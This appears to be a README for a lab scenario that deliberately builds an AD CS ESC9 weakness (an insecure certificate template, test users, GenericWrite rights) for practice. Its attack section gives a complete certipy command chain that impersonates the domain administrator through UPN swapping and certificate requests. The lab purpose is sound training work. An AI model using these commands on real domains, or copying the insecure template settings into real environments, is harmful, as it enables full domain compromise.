# esc9

Creates template `ESC9` (`CT_FLAG_NO_SECURITY_EXTENSION`, enrollable by `<NB>\Domain Users`), users `scn-esc9-attacker` and `scn-esc9-victim` (password `Aa1234567890!`), and `GenericWrite` for the attacker on the victim.

Depends on `esc10-case1` enabled on the DC of the CA's domain (weak certificate binding), for example `enable_scenario esc10-case1 dc01` before `enable_scenario esc9` on GOAD-Base for the dc01 CA. Disabling `esc10-case1` there is refused while `esc9` is enabled; `--cascade` removes `esc9` first.

Attack:

    certipy shadow auto -u scn-esc9-attacker@<domain> -p 'Aa1234567890!' -account scn-esc9-victim
    certipy account update -u scn-esc9-attacker@<domain> -p 'Aa1234567890!' -user scn-esc9-victim -upn administrator
    certipy req -u scn-esc9-victim@<domain> -hashes <nt hash> -ca <NB>-CA -template ESC9
    certipy account update -u scn-esc9-attacker@<domain> -p 'Aa1234567890!' -user scn-esc9-victim -upn scn-esc9-victim@<domain>
    certipy auth -pfx administrator.pfx -domain <domain>

How to verify:

    certipy find -u scn-esc9-attacker@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -vulnerable -stdout   # ESC9

Disable revokes the certificates issued from `ESC9`, deletes the template and both users.
